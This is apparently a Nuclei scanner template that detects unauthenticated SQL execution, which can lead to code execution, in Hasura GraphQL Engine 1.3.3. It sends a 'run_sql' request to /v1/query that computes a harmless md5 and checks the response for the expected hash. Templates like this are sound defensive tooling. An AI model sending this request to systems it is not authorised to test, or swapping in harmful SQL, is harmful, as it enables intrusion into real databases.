id: hasura-graphql-rce
info:
  name: Hasura GraphQL 1.3.3 Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Hasura GraphQL Engine 1.3.3 allows remote attackers to execute arbitrary code via executing Postgres SQL queries when authentication is not required.
  reference:
    - https://github.com/hasura/graphql-engine/releases/tag/v2.0.9
    - https://www.exploit-db.com/exploits/49802
  tags: rce,graphql,hasura
http:
  - raw:
      - |
        POST /v1/query HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"type":"bulk","args":[{"type":"run_sql","args":{"sql":"SELECT md5('A18B9e0');","cascade":false,"read_only":false}}]}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "347b78cb6b3911b4dae9f0d5a6bc194e"
